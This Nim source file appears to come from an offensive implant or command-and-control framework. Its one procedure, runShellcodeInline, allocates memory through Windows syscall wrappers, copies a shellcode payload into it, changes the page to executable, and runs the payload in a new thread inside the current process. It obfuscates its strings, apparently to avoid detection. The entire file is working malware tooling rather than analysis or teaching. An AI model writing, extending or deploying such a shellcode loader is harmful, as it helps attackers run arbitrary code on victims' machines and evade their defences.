import ../../utils/global
import ../../utils/winapi/syscall
import ../../utils/winapi/utils
import ../../utils/msg

const
  memCommitReserve = 0x3000'u32
  pageRw = 0x04'u32
  memRelease = 0x8000'u32

proc runShellcodeInline*(payload: openArray[byte]; buf: var openArray[char]): int =
  # Allocates memory and runs shell code in the current process
  if payload.len == 0: return writeErr(obf("empty shellcode"), buf)
  var st: culong = 0
  let base = virtualAlloc(nil, payload.len.csize_t, memCommitReserve, pageRw, addr st)
  if base == nil:
    return writeErr(obf("allocation failed"), buf)
  copyMem(base, unsafeAddr payload[0], payload.len)
  var region = payload.len.csize_t
  var old: culong = 0
  var allocBase = base
  if protectVirtualMemory(currentProcess, addr allocBase, addr region, PAGE_EXECUTE_READ, addr old) != 0:
    var freeBase = base
    discard freeVirtualMemory(currentProcess, addr freeBase, memRelease)
    return writeErr(obf("VirtualProtect failed"), buf)
  inc bgWorkers
  let hThread = createThreadEx(currentProcess, base)
  if hThread == nil:
    dec bgWorkers
    var freeBase = base
    discard freeVirtualMemory(currentProcess, addr freeBase, memRelease)
    return writeErr(obf("CreateThread failed"), buf)
  defer: dec bgWorkers
  discard waitForObject(hThread)
  discard ntCloseHandle(hThread)
  var freeBase = base
  discard freeVirtualMemory(currentProcess, addr freeBase, memRelease)
  writeMsg(obf("Shellcode executed inline."), buf)
